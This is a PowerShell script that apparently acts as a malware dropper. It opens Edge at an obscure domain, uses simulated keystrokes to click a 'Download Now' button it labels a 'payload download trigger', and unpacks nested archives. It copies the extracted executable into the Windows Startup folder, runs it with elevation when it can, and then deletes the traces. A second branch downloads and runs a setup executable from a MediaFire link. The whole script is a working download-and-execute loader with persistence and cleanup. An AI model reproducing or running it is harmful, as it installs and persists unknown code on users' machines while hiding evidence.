function DarwinWaterson{
$edgePath="${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe";$tempProfile="C:\Temp\EdgeAnalysisProfile"
Add-Type -AssemblyName UIAutomationClient
Write-Host "Opening pristine Microsoft Edge testing layout..."
$edgeProcess=Start-Process -FilePath $edgePath -ArgumentList @($targetUrl,"--user-data-dir=$tempProfile","--no-first-run","--no-default-browser-check") -PassThru
Write-Host "Waiting 5 seconds for page synchronization..."
Start-Sleep -Seconds 5
$Shell=New-Object -ComObject WScript.Shell;$Shell.AppActivate($edgeProcess.Id)
Start-Sleep -Milliseconds 500
Write-Host "Navigating to initial link tag element..."
for($i=1;$i -le 6;$i++){$Shell.SendKeys("{TAB}");Start-Sleep -Milliseconds 100}
$Shell.SendKeys("{ENTER}")
Write-Host "Beginning target selection loop. Pressing TAB until button name is matched..."
$targetFound=$false;$maxTabs=1000;$tabCount=0
while(-not $targetFound -and $tabCount -lt $maxTabs){
$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 100
$focusedElement=[System.Windows.Automation.AutomationElement]::FocusedElement
if($null -ne $focusedElement){
$currentName=$focusedElement.Current.Name
if($currentName -like "*Download Now*" -or $currentName -like "*dl-btn*"){
Write-Host "Success! Selection landed on target element name: '$currentName' after $tabCount tabs."
$targetFound=$true;break
}
}
}
if($targetFound){
Write-Host "Striking payload download trigger..."
Write-Host "Waiting 5 seconds for internal webpage scan to change button status to active..."
Start-Sleep -Seconds 5
$Shell.SendKeys("{ENTER}")
}else{
Write-Error "The selection loop passed the element tree without matching the name 'Download Now'."
return
}
$fileName="download.zip";$downloadsFolder=Join-Path $env:USERPROFILE "Downloads";$filePath=Join-Path -Path $downloadsFolder -ChildPath $fileName
$timeoutSeconds=60;$elapsed=0;$interval=1;$fileReady=$false
if(Test-Path -LiteralPath $filePath){Remove-Item -LiteralPath $filePath -Force -ErrorAction SilentlyContinue}
Write-Host "Waiting for $fileName to appear in $downloadsFolder..."
while($elapsed -lt $timeoutSeconds){
if(Test-Path -Path $filePath){
Start-Sleep -Milliseconds 500
try{
$testInfo=Get-Item -LiteralPath $filePath -ErrorAction Stop
if($testInfo.Length -gt 0){$fileReady=$true;break}
}catch{}
}
Start-Sleep -Seconds $interval;$elapsed+=$interval
}
if(-not $fileReady){Write-Host "Timed out waiting for $fileName.";return}
Write-Host "Download detected: $filePath"
Write-Host "Extracting initial zip to $tempPath..."
& tar.exe -xf $filePath -C $tempPath
if($LASTEXITCODE -ne 0){throw "tar extraction failed with exit code $LASTEXITCODE"}
Write-Host "Searching for nested zip starting with 'v' in $tempPath..."
$subZip=Get-ChildItem -Path $tempPath -Filter "*.zip"|Where-Object{$_.Name -match '^v[\d\.]+\.zip$' -or $_.Name -like "v*"}|Select-Object -First 1
if($null -eq $subZip){Write-Warning "Could not find a nested zip starting with 'v' in $tempPath.";return}
Write-Host "Found nested zip: $($subZip.Name)"
$zipBaseName=[System.IO.Path]::GetFileNameWithoutExtension($subZip.Name)
$targetExtractPath=Join-Path $tempPath $zipBaseName
if(-not(Test-Path $targetExtractPath)){New-Item -ItemType Directory -Path $targetExtractPath|Out-Null}
Write-Host "Extracting nested zip to $targetExtractPath..."
& tar.exe -xf $subZip.FullName -C $targetExtractPath
if($LASTEXITCODE -ne 0){throw "tar extraction failed for nested zip with exit code $LASTEXITCODE"}
$targetExe=Get-ChildItem -Path $targetExtractPath -Recurse -Filter "*.exe"|Select-Object -First 1
$startupExePath=$null
if($targetExe){
Write-Host "Found executable: $($targetExe.Name). Copying to startup path: $startmenuPath"
Copy-Item -LiteralPath $targetExe.FullName -Destination $startmenuPath -Force
$startupExePath=Join-Path $startmenuPath $targetExe.Name
}else{Write-Warning "No executable file found inside the extracted folder."}
if($runExe){
if($startupExePath -and(Test-Path -LiteralPath $startupExePath)){
Write-Host "Starting executable from startup path: $startupExePath"
if($isAdmin){Start-Process -FilePath $startupExePath -Verb RunAs}else{Start-Process -FilePath $startupExePath}
}else{Write-Host "Skipping EXE launch as no executable path was resolved."}
}else{Write-Host "Skipping EXE launch."}
Write-Host "Performing cleanup..."
Remove-Item -LiteralPath $filePath -Force -ErrorAction SilentlyContinue
if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item -LiteralPath $subZip.FullName -Force -ErrorAction SilentlyContinue}
if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
Write-Host "Workflow completed successfully!"
}
# ==============================
# Main Code
# ==============================
$runExe=$true;$mediaFire=$false;$openUrl=$true
if(!($mediaFire) -and !($openUrl)){[Environment]::Exit(0)}
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if($isAdmin){
$tempPath=[System.Environment]::GetEnvironmentVariable('TEMP','Machine')
$startmenuPath=[Environment]::GetFolderPath('CommonStartup')
}else{
$tempPath=[System.Environment]::GetEnvironmentVariable('TEMP','User')
$startmenuPath=[Environment]::GetFolderPath('Startup')
}
if($openUrl){$targetUrl="https://www.whuskalc.lol:443/essential/_page.html"}
if($mediaFire){
$mediaFireUrl="https://www.mediafire.com:443/file/?/"
$folderName="Real";$exeName="RealSetup.exe"
$zipPath=Join-Path $tempPath "$folderName.zip";$extractPath=$tempPath;$exePath=Join-Path $extractPath $exeName
$headers=@{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"}
Write-Host "Getting MediaFire page..."
try{
$page=Invoke-WebRequest -Uri $mediaFireUrl -Headers $headers -UseBasicParsing -MaximumRedirection 10 -TimeoutSec 60 -ErrorAction Stop
}catch{throw "Could not access MediaFire page: $($_.Exception.Message)"}
$directUrl=$null
$directUrl=$page.Links|Where-Object{$_.href -and $_.href -match 'download.*mediafire\.com'}|Select-Object -ExpandProperty href -First 1
if(-not $directUrl){
$pattern='https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
$matches=[regex]::Matches($page.Content,$pattern)
foreach($match in $matches){
if($match.Value -match 'download'){$directUrl=$match.Value;break}
}
}
if(-not $directUrl){throw "Could not locate the MediaFire download URL."}
Write-Host "`nDirect URL:`n$directUrl`n"
if(Test-Path -LiteralPath $zipPath){Remove-Item -LiteralPath $zipPath -Force}
Write-Host "Downloading to: $zipPath"
$curlArgs=@("--location","--fail","--retry","3","--retry-delay","2","--connect-timeout","30","--max-time","600","-A","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","-o",$zipPath,$directUrl)
& curl.exe @curlArgs
if($LASTEXITCODE -ne 0){throw "curl download failed with exit code $LASTEXITCODE"}
if(-not(Test-Path -LiteralPath $zipPath)){throw "Download failed: file was not created."}
$file=Get-Item -LiteralPath $zipPath
Write-Host "Downloaded: $($file.FullName)`nSize: $($file.Length) bytes"
if($file.Length -lt 1000){throw "Downloaded file is suspiciously small."}
Write-Host "Extracting..."
& tar.exe -xf $zipPath -C $extractPath
if($LASTEXITCODE -ne 0){throw "tar extraction failed with exit code $LASTEXITCODE"}
if($runExe){
Write-Host "Starting $exePath"
if($isAdmin){Start-Process -FilePath $exePath -Verb RunAs}else{Start-Process -FilePath $exePath}
}else{Write-Host "Skipping EXE launch."}
}
if($openUrl){DarwinWaterson}else{Write-Host "Skipping Url launch."}
Write-Host "Performing final cleanup of temporary archive files..."
$tempZips=Get-ChildItem -Path $tempPath -Filter "*.zip" -ErrorAction SilentlyContinue
$downloadZip=Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\download.zip"
foreach($zip in $tempZips){Remove-Item -LiteralPath $zip.FullName -Force -ErrorAction SilentlyContinue}
if(Test-Path -LiteralPath $downloadZip){Remove-Item -LiteralPath $downloadZip -Force -ErrorAction SilentlyContinue}
Write-Host "Done!"
Read-Host "Press Enter to exit..."
[Environment]::Exit(0)
